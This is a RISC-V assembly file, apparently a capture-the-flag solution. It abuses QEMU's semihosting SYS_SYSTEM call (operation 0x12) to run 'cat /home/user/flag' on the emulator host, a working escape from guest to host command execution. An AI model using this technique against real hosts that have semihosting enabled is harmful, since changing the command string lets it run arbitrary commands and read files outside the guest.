/* (c) <guenter.ebermann@htl-hl.ac.at> */
/* see https://github.com/qemu/qemu/blob/35ba77d2fcd10efd6db8318bbd4d21fa9402143b/semihosting/arm-compat-semi.c#L559 */
.equ QEMU_SYSTEM, 0x12
.section .text
.global _start
_start:
  /* call qemu_system("cat /home/user/flag") */
  li a0, QEMU_SYSTEM
  la a1, args
  jal qemu_semihosting
endless:
  j endless

/* this calls qemu's semihosting trap:
 * does not use compressed instructions */
.balign 16
.option push
.option norvc
qemu_semihosting:
  slli x0, x0, 0x1f
  ebreak
  srai x0, x0, 0x7
  ret
.option pop

/* this prepares the arguments for qemu_system():
 * 1. pointer to "cat /home/user/flag"
 * 2. strlen("cat /home/user/flag")
 */
.balign 16
args: 
  .dword args+16
  .dword 19
  .asciz "cat /home/user/flag"

